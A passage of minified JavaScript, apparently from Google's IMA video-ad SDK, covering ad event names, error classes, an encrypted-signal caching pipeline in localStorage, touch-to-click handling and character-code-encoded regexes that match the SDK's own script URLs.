            if (c = "Flash" != b.getContentType()) {
                if (c = "All" == a.A || a.A == b.g.resourceType) c = b.getContentType(), c = null == c ? !0 : "All" == a.l || a.l == c;
                c && (c = b.xd(), c = 0 == a.o.length ? !0 : null != c ? a.o.includes(c) : !1)
            }
            if (c)
                if (b = b.g.size, (c = "IgnoreSize" == a.C) || (c = a.h, c = c == b ? !0 : c && b ? c.width == b.width &&
                        c.height == b.height : !1), c) a = !0;
                else {
                    if (c = "SelectNearMatch" == a.C) c = b.width, b = b.height, c = c > a.h.width || b > a.h.height || c < a.B / 100 * a.h.width || b < a.B / 100 * a.h.height ? !1 : !0;
                    a = c
                }
            else a = !1;
            return a
        },
        yy = function(a, b) {
            b = Ay(b);
            return null == b ? null : b.find(function(c) {
                return wy(a, c)
            }) || null
        },
        uy = function(a, b) {
            return null != b && Qb(a, b)
        };
    var X = {},
        By = (X.creativeView = "creativeview", X.start = "start", X.midpoint = "midpoint", X.firstQuartile = "firstquartile", X.thirdQuartile = "thirdquartile", X.complete = "complete", X.mute = "mute", X.unmute = "unmute", X.pause = "pause", X.rewind = "rewind", X.resume = "resume", X.fullscreen = "fullscreen", X.exitFullscreen = "exitfullscreen", X.expand = "expand", X.collapse = "collapse", X.close = "close", X.acceptInvitation = "acceptinvitation", X.userInteraction = "userInteraction", X.adCanPlay = "adCanPlay", X.adStarted = "adStarted", X.abandon = "abandon",
            X.acceptInvitationLinear = "acceptinvitationlinear", X.engagedView = "engagedview", X.instreamAdComplete = "instreamAdComplete", X.skipShown = "skipshown", X.skippableStateChanged = "skippableStateChanged", X.skip = "skip", X.progress = "progress", X.publisher_invoked_skip = "PUBLISHER_INVOKED_SKIP", X.annotation_start = "annotation_start", X.annotation_click = "annotation_click", X.annotation_close = "annotation_close", X.cta_annotation_shown = "cta_annotation_shown", X.cta_annotation_clicked = "cta_annotation_clicked", X.cta_annotation_closed =
            "cta_annotation_closed", X.replay = "replay", X.stop = "stop", X.autoplayDisallowed = "autoplayDisallowed", X.error = "error", X.mediaLoadTimeout = "mediaLoadTimeout", X.linearChanged = "linearChanged", X.click = "click", X.contentPauseRequested = "contentPauseRequested", X.contentResumeRequested = "contentResumeRequested", X.discardAdBreak = "discardAdBreak", X.updateAdsRenderingSettings = "updateAdsRenderingSettings", X.durationChange = "durationChange", X.expandedChanged = "expandedChanged", X.autoClose = "autoClose", X.userClose = "userClose",
            X.userRecall = "userRecall", X.prefetched = "prefetched", X.loaded = "loaded", X.init = "init", X.allAdsCompleted = "allAdsCompleted", X.adMetadata = "adMetadata", X.adBreakReady = "adBreakReady", X.adBreakFetchError = "adBreakFetchError", X.log = "log", X.volumeChange = "volumeChange", X.companionBackfill = "companionBackfill", X.companionInitialized = "companionInitialized", X.companionImpression = "companionImpression", X.companionClick = "companionClick", X.impression = "impression", X.interaction = "interaction", X.adProgress = "adProgress",
            X.adBuffering = "adBuffering", X.trackingUrlPinged = "trackingUrlPinged", X.measurable_impression = "measurable_impression", X.custom_metric_viewable = "custom_metric_viewable", X.viewable_impression = "viewable_impression", X.fully_viewable_audible_half_duration_impression = "fully_viewable_audible_half_duration_impression", X.overlay_resize = "overlay_resize", X.overlay_unmeasurable_impression = "overlay_unmeasurable_impression", X.overlay_unviewable_impression = "overlay_unviewable_impression", X.overlay_viewable_immediate_impression =
            "overlay_viewable_immediate_impression", X.overlay_viewable_end_of_session_impression = "overlay_viewable_end_of_session_impression", X.externalActivityEvent = "externalActivityEvent", X.adEvent = "adEvent", X.configure = "configure", X.remainingTime = "remainingTime", X.destroy = "destroy", X.resize = "resize", X.volume = "volume", X.authorIconClicked = "videoAuthorIconClicked", X.authorNameClicked = "videoAuthorClicked", X.videoClicked = "videoClicked", X.videoIconClicked = "videoIconClicked", X.learnMoreClicked = "videoLearnMoreClicked",
            X.muteClicked = "videoMuteClicked", X.titleClicked = "videoTitleClicked", X.skipShown = "SKIP_SHOWN", X.videoSkipClicked = "SKIPPED", X.unmuteClicked = "videoUnmuteClicked", X.vpaidEvent = "vpaidEvent", X.show_ad = "show_ad", X.video_card_endcap_collapse = "video_card_endcap_collapse", X.video_card_endcap_dismiss = "video_card_endcap_dismiss", X.video_card_endcap_impression = "video_card_endcap_impression", X.mediaUrlPinged = "mediaUrlPinged", X.breakStart = "breakstart", X.breakEnd = "breakend", X.omidReady = "omidReady", X.omidUnavailable =
            "omidUnavailable", X.omidAdSessionCompleted = "omidAdSessionCompleted", X.omidAdSessionAbandoned = "omidAdSessionAbandoned", X.verificationNotExecuted = "verificationNotExecuted", X.loadStart = "loadStart", X.seeked = "seeked", X.seeking = "seeking", X);
    var Cy = function(a) {
        M.call(this);
        this.h = a || "goog_" + $c++;
        this.o = [];
        this.l = !1
    };
    t(Cy, M);
    Cy.prototype.connect = function() {
        for (this.l = !0; 0 != this.o.length;) {
            var a = this.o.shift();
            this.sendMessage(a.name, a.type, a.data)
        }
    };
    var Dy = function(a, b, c, d) {
        a.l ? a.sendMessage(b, c, d) : a.o.push({
            name: b,
            type: c,
            data: d
        })
    };
    Cy.prototype.sendMessage = function() {};

    function Ey(a) {
        a = ju(a, Mm() ? "https" : window.location.protocol);
        if (Mm()) Fy(a);
        else try {
            a && (lt(a) ? pt(a) : ut(a))
        } catch (b) {}
    }

    function Fy(a) {
        (new Du).get({
            url: a,
            timeout: new fu
        }).then(function() {}, function() {})
    };
    var Gy = function(a, b, c) {
        var d = Error.call(this);
        this.message = d.message;
        "stack" in d && (this.stack = d.stack);
        this.l = b;
        this.g = c;
        this.o = a
    };
    t(Gy, Error);
    l = Gy.prototype;
    l.getAd = function() {
        return this.B
    };
    l.getInnerError = function() {
        return this.h
    };
    l.getMessage = function() {
        return this.l
    };
    l.getErrorCode = function() {
        return this.g
    };
    l.Bd = function() {
        return 1E3 > this.g ? this.g : 900
    };
    l.getType = function() {
        return this.o
    };
    l.toString = function() {
        return "AdError " + this.getErrorCode() + ": " + this.getMessage() + (null != this.getInnerError() ? " Caused by: " + this.getInnerError() : "")
    };
    var Hy = function(a, b) {
        this.message = a;
        this.errorCode = b
    };
    Hy.prototype.getErrorCode = function() {
        return this.errorCode
    };
    Hy.prototype.getMessage = function() {
        return this.message
    };
    var Iy = new Hy("Failed to initialize ad playback element before starting ad playback.", 400),
        Jy = new Hy("The provided {0} information: {1} is invalid.", 1101);

    function Ky(a, b, c) {
        var d = void 0 === b ? null : b;
        if (!(d instanceof Gy)) {
            var e = a.errorCode,
                f = a.message,
                g = Array.prototype.slice.call(arguments, 2);
            if (0 < g.length)
                for (var h = 0; h < g.length; h++) f = f.replace(new RegExp("\\{" + h + "\\}", "ig"), g[h]);
            e = new Gy("adPlayError", f, e);
            e.h = d;
            d = e
        }
        return d
    };
    var Ly = function() {
            this.errorMessage = this.info = this.error = this.Wc = null
        },
        My = function(a, b) {
            a.Wc = b;
            return a
        };
    Ly.prototype.getError = function() {
        return this.error
    };
    var Ny = function(a, b) {
        a.errorMessage = b;
        return a
    };
    Ly.prototype.getErrorMessage = function() {
        return this.errorMessage
    };
    var Oy = function() {
            this.cache = {}
        },
        Sy = function() {
            Py || (Qy = Lg(zg), Ry = Lg(yg), Py = new Oy);
            return Py
        },
        Ty = function(a) {
            var b = C(a, 3);
            if (!b) return 3;
            if (void 0 === C(a, 2)) return 4;
            a = Date.now();
            return a > b + 36E5 * Ry ? 2 : a > b + 36E5 * Qy ? 1 : 0
        };
    Oy.prototype.get = function(a, b) {
        var c = new Ly;
        if (this.cache[a]) return My(c, this.cache[a]);
        var d = "";
        try {
            d = b.getItem("_GESPSK-" + a)
        } catch (e) {
            return c.error = 6, Ny(c, e.message)
        }
        if (!d) return new Ly;
        b = null;
        try {
            b = xe(Ak, d ? JSON.parse(d) : null)
        } catch (e) {
            return a = new Ly, a.error = 5, Ny(a, e.message)
        }
        b && (this.cache[a] = b);
        return My(new Ly, b)
    };
    Oy.prototype.set = function(a, b) {
        var c = C(a, 1),
            d = "_GESPSK-" + c,
            e = My(new Ly, a);
        try {
            b.setItem(d, Ne(a))
        } catch (f) {
            e.info = 7, Ny(e, f.message)
        }
        this.cache[c] = a;
        return e
    };
    var Py = null,
        Qy = 24,
        Ry = 72;
    var Uy = function() {
        this.g = function() {
            return []
        }
    };

    function Vy(a, b, c, d) {
        c = void 0 === c ? null : c;
        d = void 0 === d ? {} : d;
        if (Math.random() < Lg(Bg)) {
            var e = {},
                f = Object,
                g = f.assign;
            e.c = String(a);
            a = String;
            var h = window;
            if ("number" !== typeof h.goog_pvsid) try {
                Object.defineProperty(h, "goog_pvsid", {
                    value: Math.floor(Math.random() * Math.pow(2, 52)),
                    configurable: !1
                })
            } catch (k) {}
            dg(g.call(f, (e.pc = a(Number(h.goog_pvsid) || -1), e.em = c, e.lid = b, e.eids = G(Uy).g().join(), e), d), "esp")
        }
    };

    function Wy(a) {
        if (!a) return null;
        var b = new wk,
            c = Lg(Ag),
            d = [],
            e = RegExp("^_GESPSK-(.+)$");
        try {
            for (var f = 0; f < a.length; f++) {
                var g = (e.exec(a.key(f)) || [])[1];
                g && d.push(g)
            }
        } catch (k) {}
        d = q(d);
        for (e = d.next(); !e.done; e = d.next())
            if (e = e.value, f = Sy().get(e, a), f.getError()) Vy(f.getError(), e, f.getErrorMessage());
            else if (f = f.Wc)
            if (g = Ty(f), 0 === g || 1 === g)
                if (g = C(f, 2), 0 <= c && g && g.length > c) Vy(12, e);
                else {
                    var h = Ak;
                    g = Je(b, h, 2);
                    f = f ? f : new h;
                    h = C(b, 2);
                    g.push(f);
                    h.push(Ke(f, !1));
                    Vy(19, e)
                }
        Je(b, Ak, 2).length ? (a = new ce, oe(a, 1, Je(b, xk,
            1), zk), oe(a, 2, Je(b, Ak, 2), Ck), Pe(b, a), b = he(a), b = Zd(b, 2)) : b = null;
        return b
    };
    var Xy = function() {
        L.apply(this, arguments);
        this.g = [];
        this.h = [];
        this.l = []
    };
    t(Xy, L);
    Xy.prototype.N = function() {
        this.g.length = 0;
        this.l.length = 0;
        this.h.length = 0;
        L.prototype.N.call(this)
    };
    var Yy = function() {
        var a = this;
        this.promise = new Promise(function(b, c) {
            a.resolve = b;
            a.reject = c
        })
    };
    var Zy = function(a) {
        a = Error.call(this, a);
        this.message = a.message;
        "stack" in a && (this.stack = a.stack);
        Object.setPrototypeOf(this, Zy.prototype);
        this.name = "InputError"
    };
    t(Zy, Error);
    var $y = function() {
            var a = this;
            this.C = this.o = null;
            this.B = -1;
            this.h = new Yy;
            this.g = !1;
            this.h.promise.then(function() {
                -1 !== a.B && (a.C = Xg() - a.B)
            }, function() {})
        },
        az = function() {
            $y.apply(this, arguments)
        };
    t(az, $y);
    var bz = function(a, b) {
            a.g || (a.g = !0, a.o = b, a.h.resolve(b))
        },
        cz = function(a) {
            a.g || (a.g = !0, a.o = null, a.h.resolve(null))
        };
    da.Object.defineProperties(az.prototype, {
        promise: {
            configurable: !0,
            enumerable: !0,
            get: function() {
                return this.h.promise
            }
        },
        l: {
            configurable: !0,
            enumerable: !0,
            get: function() {
                return this.g
            }
        }
    });
    var dz = function(a) {
        $y.call(this);
        this.l = a
    };
    t(dz, $y);
    da.Object.defineProperties(dz.prototype, {
        error: {
            configurable: !0,
            enumerable: !0,
            get: function() {
                return this.l.A
            }
        }
    });
    var ez = function(a) {
        dz.call(this, a);
        this.l = a
    };
    t(ez, dz);
    da.Object.defineProperties(ez.prototype, {
        value: {
            configurable: !0,
            enumerable: !0,
            get: function() {
                return this.l.o
            }
        }
    });

    function fz(a, b) {
        return ab(this, function d() {
            var e, f, g;
            return Da(d, function(h) {
                if (1 == h.g) return e = 0 < b ? a.filter(function(k) {
                    return !k.nd
                }) : a, wa(h, Promise.all(e.map(function(k) {
                    return k.td.promise
                })), 2);
                if (3 != h.g) {
                    if (a.length === e.length) return h.return(0);
                    f = a.filter(function(k) {
                        return k.nd
                    });
                    g = Xg();
                    return wa(h, Promise.race([Promise.all(f.map(function(k) {
                        return k.td.promise
                    })), new Promise(function(k) {
                        return void setTimeout(k, b)
                    })]), 3)
                }
                return h.return(Xg() - g)
            })
        })
    }
    var gz = function(a, b) {
        b = void 0 === b ? 0 : b;
        L.call(this);
        this.id = a;
        this.D = b;
        this.g = new Xy;
        this.C = !1;
        this.J = -1;
        Vi(this, this.g)
    };
    t(gz, L);
    gz.prototype.start = function() {
        return ab(this, function b() {
            var c = this,
                d, e, f, g;
            return Da(b, function(h) {
                switch (h.g) {
                    case 1:
                        if (c.C) return h.return();
                        c.C = !0;
                        h.h = 2;
                        return wa(h, fz(c.g.h, c.D), 4);
                    case 4:
                        c.J = h.A;
                        if (c.Ra()) {
                            h.g = 5;
                            break
                        }
                        for (var k = 0, n = q(c.g.l), m = n.next(); !m.done; m = n.next()) {
                            if (null === m.value.l.o) throw Error("missing input: " + c.id + "/" + k);
                            ++k
                        }
                        d = q(c.g.g);
                        for (e = d.next(); !e.done; e = d.next()) f = e.value, f.B = Xg();
                        return wa(h, c.A(), 5);
                    case 5:
                        h.g = 0;
                        h.h = 0;
                        break;
                    case 2:
                        g = xa(h);
                        if (c.Ra()) return h.return();
                        if (!(g instanceof Zy) && g instanceof Error && (c.G(c.id, g), c.g.g.length))
                            for (k = new Zy(g.message), n = q(c.g.g), m = n.next(); !m.done; m = n.next())
                                if (m = m.value, !m.l) {
                                    var v = k;
                                    m.g = !0;
                                    m.A = v;
                                    m.h.reject(v)
                                }
                        h.g = 0
                }
            })
        })
    };
    var hz = function(a) {
            var b = new az;
            a.g.g.push(b);
            return b
        },
        iz = function(a, b) {
            a.g.h.push({
                nd: !1,
                td: b
            });
            return new ez(b)
        };
    var jz = function(a, b) {
        gz.call(this, a);
        this.id = a;
        this.G = b
    };
    t(jz, gz);
    var kz = function(a, b, c, d) {
        jz.call(this, 655, d);
        this.Ea = a;
        this.B = b;
        this.H = c;
        this.l = hz(this);
        this.o = hz(this);
        this.h = Lg(xg)
    };
    t(kz, jz);
    kz.prototype.A = function() {
        var a, b = Sy().get(this.Ea, this.H);
        if (b.getError()) Vy(b.getError(), this.Ea, b.getErrorMessage()), cz(this.l), cz(this.o);
        else {
            var c = Date.now();
            if (b = b.Wc)
                if (this.h && (null == C(b, 8) && (Vy(33, this.Ea), Bk(b, this.h)), null == C(b, 7) && (Vy(34, this.Ea), Ee(b, 7, Math.round(Date.now() / 1E3 / 60)))), null != C(b, 3) || Vy(35, this.Ea), this.h) {
                    var d = Ae(b, 8),
                        e = null !== (a = C(b, 7)) && void 0 !== a ? a : c;
                    d < this.h && Bk(b, Math.min(d + Number((this.h * (c / 1E3 / 60 - e) / 60).toFixed(3)), this.h));
                    1 > Ae(b, 8) ? (c = {}, Vy(22, this.Ea, null,
                        (c.t = String(e), c.cr = String(d), c.cs = String(Ty(b)), c)), cz(this.l), cz(this.o)) : (bz(this.l, this.B), bz(this.o, b))
                } else bz(this.l, this.B), bz(this.o, b);
            else bz(this.l, this.B), b = this.o, d = new Ak, d = Ee(d, 1, this.Ea), d = Bk(d, this.h), c = Ee(d, 3, c), bz(b, c)
        }
    };

    function lz(a, b, c, d) {
        Vy(18, a);
        try {
            var e = Xg();
            Lg(xg) && (Bk(b, Number((Ae(b, 8) - 1).toFixed(3))), Ee(b, 7, Math.round(e / 1E3 / 60)));
            return c().then(function(f) {
                Vy(29, a, null, {
                    delta: String(Xg() - e)
                });
                Ee(b, 3, Date.now());
                mz(a, b, f, d);
                return b
            }).catch(function(f) {
                mz(a, b, C(b, 2), d);
                Vy(28, a, nz(f));
                return b
            })
        } catch (f) {
            return mz(a, b, C(b, 2), d), Vy(1, a, nz(f)), Promise.resolve(b)
        }
    }
    var mz = function(a, b, c, d) {
            "string" !== typeof c ? Vy(21, a) : c || Vy(20, a);
            Ee(b, 2, c);
            b = Sy().set(b, d);
            b.getErrorMessage() ? Vy(b.info, a, b.getErrorMessage()) : Vy(27, a)
        },
        nz = function(a) {
            return "string" === typeof a ? a : a instanceof Error ? a.message : null
        };
    var oz = function(a, b, c, d) {
        jz.call(this, 658, d);
        this.H = c;
        this.h = hz(this);
        this.l = hz(this);
        this.o = hz(this);
        this.B = iz(this, a);
        this.K = iz(this, b)
    };
    t(oz, jz);
    oz.prototype.A = function() {
        var a = this;
        if (this.B.value) {
            var b = function(g) {
                    bz(a.h, {
                        id: C(g, 1),
                        wc: C(g, 2)
                    })
                },
                c = this.B.value,
                d = this.K.value,
                e = C(d, 1),
                f = Ty(d);
            switch (f) {
                case 0:
                    Vy(24, e);
                    break;
                case 1:
                    Vy(25, e);
                    break;
                case 2:
                    Vy(26, e);
                    break;
                case 3:
                    Vy(9, e);
                    break;
                case 4:
                    Vy(23, e)
            }
            switch (f) {
                case 0:
                    b(d);
                    pz(this);
                    break;
                case 1:
                    b(d);
                    bz(this.l, c);
                    bz(this.o, d);
                    break;
                case 3:
                case 2:
                case 4:
                    Ee(d, 2, null), lz(e, d, c, this.H).then(b), pz(this)
            }
        } else cz(this.h), pz(this)
    };
    var pz = function(a) {
        cz(a.l);
        cz(a.o)
    };

    function qz() {
        var a = window;
        var b = void 0 === b ? function() {} : b;
        return new Promise(function(c) {
            var d = function() {
                c(b());
                gf(a, "load", d)
            };
            ff(a, "load", d)
        })
    };
    var rz = function(a, b, c, d) {
        jz.call(this, 662, d);
        this.o = c;
        this.h = iz(this, a);
        this.l = iz(this, b)
    };
    t(rz, jz);
    rz.prototype.A = function() {
        var a = this;
        this.l.value && this.h.value && qz().then(function() {
            var b = a.l.value,
                c = C(b, 1);
            lz(c, b, a.h.value, a.o)
        })
    };
    var sz = function() {
        L.apply(this, arguments);
        this.g = []
    };
    t(sz, L);
    sz.prototype.N = function() {
        L.prototype.N.call(this);
        this.g.length = 0
    };

    function tz(a, b, c, d) {
        return ab(this, function f() {
            var g, h, k, n, m;
            return Da(f, function(v) {
                if (1 == v.g) {
                    g = new kz(a, b, c, d);
                    h = new oz(g.l, g.o, c, d);
                    k = new rz(h.l, h.o, c, d);
                    n = new sz;
                    for (var r = q([g, h, k]), w = r.next(); !w.done; w = r.next()) w = w.value, Vi(n, w), n.g.push(w);
                    if (n.g.length)
                        for (r = q(n.g), w = r.next(); !w.done; w = r.next()) w.value.start();
                    return wa(v, h.h.promise, 2)
                }
                m = v.A;
                return v.return(m ? m : {
                    id: a,
                    wc: null
                })
            })
        })
    };
    var uz = function(a, b) {
        this.B = b;
        this.l = [];
        this.h = [];
        this.g = [];
        a = q(a);
        for (b = a.next(); !b.done; b = a.next()) this.push(b.value)
    };
    uz.prototype.push = function(a) {
        var b = a.id;
        a = a.collectorFunction;
        if ("string" !== typeof b) Vy(37, "invalid-id");
        else if ("function" !== typeof a) Vy(14, b);
        else {
            var c = {};
            Vy(17, b, null, (c.api = "1", c));
            b = tz(b, a, this.B, this.o);
            this.l.push(b);
            a = q(this.h);
            for (c = a.next(); !c.done; c = a.next()) b.then(c.value)
        }
    };
    var vz = function(a, b) {
        a.h.push(b);
        a = q(a.l);
        for (var c = a.next(); !c.done; c = a.next()) c.value.then(b)
    };
    uz.prototype.o = function(a, b) {
        for (var c = q(this.g), d = c.next(); !d.done; d = c.next()) d = d.value, d(a, b)
    };

    function wz(a, b, c, d) {
        var e;
        if (b) {
            var f = Nf();
            var g = window;
            g = Kf(g.top) ? g.top : null;
            f === g || Kg(wg) ? a.encryptedSignalProviders instanceof uz ? (d && vz(a.encryptedSignalProviders, d), a.encryptedSignalProviders.g.push(c)) : (f = new uz(null !== (e = a.encryptedSignalProviders) && void 0 !== e ? e : [], b), a.encryptedSignalProviders = f, d && vz(f, d), f.g.push(c)) : Vy(16, "")
        } else Vy(15, "")
    }

    function xz(a, b, c, d) {
        var e = new Map;
        b = b.map(function(f) {
            var g = f.Ea;
            return new Promise(function(h) {
                e.set(g, h)
            })
        });
        wz(a, c, d, function(f) {
            var g = f.wc;
            f = f.id;
            var h;
            return void(null === (h = e.get(f)) || void 0 === h ? void 0 : h({
                wc: g,
                id: f
            }))
        });
        return b
    };

    function yz(a) {
        if (!a || fy(a)) return null;
        try {
            return window.localStorage
        } catch (b) {
            return null
        }
    }

    function zz(a, b) {
        return (b = yz(b)) && 0 != a.length ? xz(u.googletag || (u.googletag = {}), a, b, function() {}) : null
    };
    /*


     Copyright Mathias Bynens <http://mathiasbynens.be/>

     Permission is hereby granted, free of charge, to any person obtaining
     a copy of this software and associated documentation files (the
     "Software"), to deal in the Software without restriction, including
     without limitation the rights to use, copy, modify, merge, publish,
     distribute, sublicense, and/or sell copies of the Software, and to
     permit persons to whom the Software is furnished to do so, subject to
     the following conditions:

     The above copyright notice and this permission notice shall be
     included in all copies or substantial portions of the Software.

     THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
     EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
     MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
     NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE
     LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION
     OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
     WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
    */
    var Az = function(a, b) {
        return 0 == a.indexOf(b) ? a.substr(b.length) : null
    };
    var Bz = function(a) {
        try {
            var b = new P(a);
            if (!b.h.includes(".cdn.ampproject.org")) return null;
            var c = b.g.split("/").slice(1);
            if (2 > c.length) return a;
            var d = "s" == c[1];
            if (d && 3 > c.length) return null;
            c = d ? c.slice(2) : c.slice(1);
            var e = decodeURIComponent(c[0]) + "/";
            return d ? "https://" + e + c.slice(1).join("/") : "http://" + e + c.slice(1).join("/")
        } catch (f) {
            return null
        }
    };
    var Cz = function() {
        M.call(this);
        this.G = !1;
        this.g = null;
        this.A = this.D = this.K = !1;
        this.h = 0;
        this.o = [];
        this.C = !1;
        this.R = this.M = Infinity;
        this.l = 0;
        this.J = new yu(this);
        Vi(this, this.J);
        this.H = {}
    };
    t(Cz, M);
    var Ez = function(a, b) {
            null == b || a.G || (a.g = b, Dz(a), a.G = !0)
        },
        Gz = function(a) {
            null != a.g && a.G && (Fz(a), a.G = !1, a.D = !1, a.A = !1, a.h = 0, a.o = [], a.C = !1)
        },
        Dz = function(a) {
            Fz(a);
            !(a.g instanceof M) && "ontouchstart" in document.documentElement && Fd ? (a.H = {
                touchstart: function(b) {
                    a.D = !0;
                    a.h = b.touches.length;
                    a.l && (window.clearTimeout(a.l), a.l = 0, a.K = !0);
                    a.C = Hz(a, b.touches) || 1 != b.touches.length;
                    a.C ? (a.M = Infinity, a.R = Infinity) : (a.M = b.touches[0].clientX, a.R = b.touches[0].clientY);
                    b = b.touches;
                    a.o = [];
                    for (var c = 0; c < b.length; c++) a.o.push(b[c].identifier)
                },
                touchmove: function(b) {
                    a.h = b.touches.length;
                    if (!qu(8) || Math.pow(b.changedTouches[0].clientX - a.M, 2) + Math.pow(b.changedTouches[0].clientY - a.R, 2) > Math.pow(5, 2)) a.A = !0
                },
                touchend: function(b) {
                    return void Iz(a, b)
                }
            }, Gb(a.H, function(b, c) {
                a.g.addEventListener(c, b, !1)
            })) : a.J.O(a.g, "click", a.T)
        },
        Fz = function(a) {
            a.J.Ua(a.g, "click", a.T);
            Gb(a.H, function(b, c) {
                this.g.removeEventListener(c, b, !1)
            }, a);
            a.H = {}
        },
        Iz = function(a, b) {
            !a.D || 1 != a.h || a.A || a.K || a.C || !Hz(a, b.changedTouches) || (a.l = window.setTimeout(function() {
                    return void Jz(a)
                },
                300));
            a.h = b.touches.length;
            0 == a.h && (a.D = !1, a.A = !1, a.o = []);
            a.K = !1
        };
    Cz.prototype.T = function() {
        Jz(this)
    };
    var Hz = function(a, b) {
            for (var c = 0; c < b.length; c++)
                if (a.o.includes(b[c].identifier)) return !0;
            return !1
        },
        Jz = function(a) {
            a.l = 0;
            a.dispatchEvent(new Wi("click"))
        };
    Cz.prototype.N = function() {
        Gz(this);
        M.prototype.N.call(this)
    };
    var Kz = function(a, b, c) {
        this.h = c;
        0 == b.length && (b = [
            []
        ]);
        this.g = b.map(function(d) {
            d = a.concat(d);
            for (var e = [], f = 0, g = 0; f < d.length;) {
                var h = d[f++];
                if (128 > h) e[g++] = String.fromCharCode(h);
                else if (191 < h && 224 > h) {
                    var k = d[f++];
                    e[g++] = String.fromCharCode((h & 31) << 6 | k & 63)
                } else if (239 < h && 365 > h) {
                    k = d[f++];
                    var n = d[f++],
                        m = d[f++];
                    h = ((h & 7) << 18 | (k & 63) << 12 | (n & 63) << 6 | m & 63) - 65536;
                    e[g++] = String.fromCharCode(55296 + (h >> 10));
                    e[g++] = String.fromCharCode(56320 + (h & 1023))
                } else k = d[f++], n = d[f++], e[g++] = String.fromCharCode((h & 15) << 12 |
                    (k & 63) << 6 | n & 63)
            }
            return new RegExp(e.join(""))
        })
    };
    Kz.prototype.match = function(a) {
        var b = this;
        return this.g.some(function(c) {
            c = a.match(c);
            return null == c ? !1 : !b.h || 1 <= c.length && "3.479.1" == c[1] || 2 <= c.length && "3.479.1" == c[2] ? !0 : !1
        })
    };
    var Lz = [104, 116, 116, 112, 115, 63, 58, 47, 47, 105, 109, 97, 115, 100, 107, 92, 46, 103, 111, 111, 103, 108, 101, 97, 112, 105, 115, 92, 46, 99, 111, 109, 47, 106, 115, 47, 40, 115, 100, 107, 108, 111, 97, 100, 101, 114, 124, 99, 111, 114, 101, 41, 47],
        Mz = [104, 116, 116, 112, 115, 63, 58, 47, 47, 115, 48, 92, 46, 50, 109, 100, 110, 92, 46, 110, 101, 116, 47, 105, 110, 115, 116, 114, 101, 97, 109, 47, 104, 116, 109, 108, 53, 47],
        Nz = [104, 116, 116, 112, 115, 63, 58, 47, 47, 105, 109, 97, 115, 100, 107, 92, 46, 103, 111, 111, 103, 108, 101, 97, 112, 105, 115, 92, 46, 99, 111, 109, 47, 112, 114, 101, 114, 101, 108, 101, 97, 115,
            101, 47, 106, 115, 47, 91, 48, 45, 57, 93, 43, 92, 46, 91, 48, 45, 57, 92, 46, 93, 43, 47
        ],
        Oz = [
            [105, 109, 97, 51, 92, 46, 106, 115],
            [105, 109, 97, 51, 95, 100, 101, 98, 117, 103, 92, 46, 106, 115]
        ],
        Pz = [
            [98, 114, 105, 100, 103, 101, 40, 91, 48, 45, 57, 93, 43, 92, 46, 91, 48, 45, 57, 92, 46, 93, 43, 41, 40, 95, 40, 91, 97, 45, 122, 48, 45, 57, 93, 41, 123, 50, 44, 51, 125, 41, 123, 48, 44, 50, 125, 92, 46, 104, 116, 109, 108],
            [98, 114, 105, 100, 103, 101, 40, 91, 48, 45, 57, 93, 43, 92, 46, 91, 48, 45, 57, 92, 46, 93, 43, 41, 95, 100, 101, 98, 117, 103, 40, 95, 40, 91, 97, 45, 122, 48, 45, 57, 93, 41, 123, 50, 44, 51, 125, 41, 123, 48, 44,
                50, 125, 92, 46, 104, 116, 109, 108
            ],
            [98, 114, 105, 100, 103, 101, 40, 95, 40, 91, 97, 45, 122, 48, 45, 57, 93, 41, 123, 50, 44, 51, 125, 41, 123, 48, 44, 50, 125, 92, 46, 104, 116, 109, 108]
        ],
        Qz = [
            [111, 117, 116, 115, 116, 114, 101, 97, 109, 92, 46, 106, 115],
            [111, 117, 116, 115, 116, 114, 101, 97, 109, 95, 100, 101, 98, 117, 103, 92, 46, 106, 115]
        ],
        Rz = new Kz(Lz, Oz, !1),
        Sz = new Kz(Lz, Pz, !0),
        Tz = new Kz(Mz, Oz, !1),
        Uz = new Kz(Mz, Pz, !0),
        Vz = new Kz(Nz, Oz, !1),
        Wz = new Kz([104, 116, 116, 112, 115, 63, 58, 47, 47, 40, 112, 97, 103, 101, 97, 100, 50, 124, 116, 112, 99, 41, 92, 46, 103, 111, 111, 103, 108, 101, 115,
            121, 110, 100, 105, 99, 97, 116, 105, 111, 110, 92, 46, 99, 111, 109, 47, 112, 97, 103, 101, 97, 100, 47, 40, 103, 97, 100, 103, 101, 116, 115, 124, 106, 115, 41, 47
        ], [], !1),
        Xz = new Kz(Lz, [
            [100, 97, 105, 95, 105, 102, 114, 97, 109, 101, 40, 91, 48, 45, 57, 93, 43, 92, 46, 91, 48, 45, 57, 92, 46, 93, 43, 41, 40, 95, 40, 91, 97, 45, 122, 48, 45, 57, 93, 41, 123, 50, 44, 51, 125, 41, 123, 48, 44, 50, 125, 92, 46, 104, 116, 109, 108],
            [100, 97, 105, 95, 105, 102, 114, 97, 109, 101, 40, 91, 48, 45, 57, 93, 43, 92, 46, 91, 48, 45, 57, 92, 46, 93, 43, 41, 95, 100, 101, 98, 117, 103, 40, 95, 40, 91, 97, 45, 122, 48, 45, 57, 93, 41, 123, 50, 44,
                51, 125, 41, 123, 48, 44, 50, 125, 92, 46, 104, 116, 109, 108
            ],
            [100, 97, 105, 95, 105, 102, 114, 97, 109, 101, 40, 95, 40, 91, 97, 45, 122, 48, 45, 57, 93, 41, 123, 50, 44, 51, 125, 41, 123, 48, 44, 50, 125, 92, 46, 104, 116, 109, 108]
        ], !0),
        Yz = new Kz(Lz, Qz, !1),
        Zz = new Kz(Nz, Qz, !1),
        Jb = {
            dg: Rz,
            bg: Sz,
            xg: Tz,
            wg: Uz,
            eg: Vz,
            $g: Wz,
            cg: Xz,
            Hg: Yz,
            Ig: Zz
        };

    function $z(a) {
        for (var b = null, c = 0; c < a.length; c++)
            if (b = a[c], Ib(function(d) {
                    return d.match(b.src)
                })) return b;
        return null
    };
    var aA = function() {
            var a = E(),
                b = document;
            return new P(a.parent == a ? a.location.href : b.referrer)
        },
        bA = function(a, b) {
            bt(a, "url", "");
            try {
                var c = 2083 - a.toString().length - 1;
